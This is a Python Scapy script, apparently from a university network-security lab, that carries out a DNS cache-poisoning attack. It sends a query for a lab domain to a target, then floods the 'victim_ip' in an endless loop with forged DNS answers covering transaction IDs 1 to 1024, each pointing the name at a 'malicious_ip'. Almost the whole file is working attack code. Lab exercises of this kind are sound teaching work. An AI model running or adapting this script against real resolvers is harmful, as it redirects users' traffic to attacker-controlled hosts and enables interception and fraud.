# Se realiza esto por error obtenido al no realizarlo
# Solución : https://stackoverflow.com/questions/46602880/importerror-no-module-named-scapy-all
import os
os.sys.path.append('/home/cc5312/.local/lib/python3.8/site-packages')
print (os.sys.path)

from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR

original_sport = 54323

# Tunnear valores de la ip de acuerdo al valor entregado por la VPN
malicious_ip = '10.41.0.130'
victim_ip = '172.17.69.106'

def send_dns(ip, port):
    print(f"dns: {ip}:{port}")
    pkt = IP(dst=ip) / UDP(sport=55312, dport=port) / DNS(rd=1, id=12345,  qd=DNSQR(
        qtype=1, qname="spoofed.lab4.cc5312.xor.cl"))  # qtype=1 is A and DNS Request ID is 12345
    print(f"Sending: {pkt.summary()}")
    # ANS is like  IP(src=ip, dst=<myip>) / UDP(sport=port, dport=54323) / DNS(rd=1, qd=DNSQR(qtype=1, qname="lab4.cc5312.xor.cl") an=[<RRs received>]) # 1 is A
    ans = sr1(pkt, verbose=1)
    print(f"received:")
    ans.show()
    print(ans.command())

def create_pkt3(number):

    return IP(version=4, ihl=5, tos=0, flags=2, frag=0, ttl=58, proto=17, chksum=None, dst=victim_ip)/UDP(sport=53, dport=55312, chksum=None)/DNS(length=None, id=number, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0, qd=DNSQR(qname=b'spoofed.lab4.cc5312.xor.cl.', qtype=1, qclass=1), an=DNSRR(rrname=b'spoofed.lab4.cc5312.xor.cl.', type=1, rclass=1, ttl=1, rdlen=None, rdata=malicious_ip), ns=None, ar=None)


from datetime import datetime
while True:
    l = []
    print("Hora actual:")
    print(datetime.now().time())
    for i in range(1,1025):
        #send(create_pkt3(i))
        l.append(create_pkt3(i).copy())
    send(l)
